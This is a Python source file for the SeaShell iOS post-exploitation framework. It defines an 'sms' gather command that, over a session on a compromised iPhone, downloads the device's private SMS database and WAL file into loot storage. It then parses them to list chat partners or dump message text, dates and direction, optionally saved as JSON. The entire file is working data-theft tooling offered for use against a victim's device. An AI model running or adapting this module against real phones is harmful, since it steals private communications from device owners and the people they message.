"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

import json

from seashell.lib.loot import Loot

from pex.db import DB
from pex.string import String

from badges.cmd import Command


class ExternalCommand(Command, DB):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "sms",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "View device SMS for a partner or save as json.",
            'Usage': "sms [-l|<partner>] [local_file]",
            'MinArgs': 1
        })

        self.db_file = '/private/var/mobile/Library/SMS/sms.db'
        self.wal_file = '/private/var/mobile/Library/SMS/sms.db-wal'

    def run(self, args):
        if not self.session.download(
                self.db_file, Loot().specific_loot('sms.db')):
            return

        if not self.session.download(
                self.wal_file, Loot().specific_loot('sms.db-wal')):
            return

        if args[1] == '-l':
            self.print_process("Parsing SMS chats...")

            try:
                chats = self.parse_sms_chats(
                    Loot().specific_loot('sms.db'))
            except Exception:
                self.print_error(f"Failed to parse SMS chats!")
                return

            if len(args) >= 3:
                with open(args[2], 'w') as f:
                    self.print_process(f"Saving SMS chats to {args[2]}...")
                    json.dump(chats, f)

                self.print_success(f"Saved SMS chats to {args[2]}!")
                return

            chats_data = []
            chat_id = 0

            for item in chats:
                chats_data.append((chat_id, item['guid'].split(';')[2]))
                chat_id += 1

            if chats_data:
                self.print_table(f"SMS chats", ('ID', 'Partner'), *chats_data)
            else:
                self.print_warning("No SMS chats available on device.")

            return

        self.print_process(f"Parsing SMS for {args[1]}...")

        try:
            sms = self.parse_sms_chat(
                Loot().specific_loot('sms.db'), args[1], imessage=False)
        except Exception as e:
            self.print_error(f"Failed to parse SMS for {args[1]}: {str(e)}!")
            return

        if len(args) >= 3:
            with open(args[2], 'w') as f:
                self.print_process(f"Saving SMS chat to {args[2]}...")
                json.dump(sms, f)

            self.print_success(f"Saved SMS chat to {args[2]}!")
            return

        sms_data = []

        for item in sms['data']:
            sms_data.append((
                item['message_id'],
                item['date'],
                'Sent' if item['is_from_me'] else 'Received',
                item['text'],
            ))

        if sms_data:
            self.print_table(f"SMS ({args[1]})", ('ID', 'Date', 'Status', 'Text'), *sms_data)
        else:
            self.print_warning(f"No SMS data available for {args[1]}.")
